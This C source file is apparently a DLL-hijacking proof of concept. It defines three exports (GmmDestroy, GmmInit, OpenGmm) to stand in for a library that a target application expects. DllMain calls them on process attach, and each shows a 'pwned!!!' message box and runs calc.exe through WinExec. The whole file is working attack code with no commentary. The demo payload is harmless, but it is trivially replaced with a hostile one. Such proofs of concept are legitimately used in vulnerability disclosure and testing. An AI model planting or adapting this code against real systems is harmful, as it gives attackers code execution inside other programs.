#include <windows.h> 
#include <Winuser.h> 

int GmmDestroy(){
    MessageBox(0, "Dll Hijacked", "pwned!!!", MB_OK);
    WinExec("calc.exe", 0);
//    ExitProcess(0);
    return 0;
}
int GmmInit(){
    MessageBox(0, "Dll Hijacked", "pwned!!!", MB_OK);
    WinExec("calc.exe", 0);
//    ExitProcess(0);
    return 0;
}
int OpenGmm(){
    MessageBox(0, "Dll Hijacked", "pwned!!!", MB_OK);
    WinExec("calc.exe", 0);
//    ExitProcess(0);
    return 0;
}

BOOL WINAPI DllMain (HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)  
{  
  if (fdwReason == DLL_PROCESS_ATTACH)  
  {  
    GmmDestroy(); 
    GmmInit();
    OpenGmm(); 
  }  
  
  return TRUE;  
}  
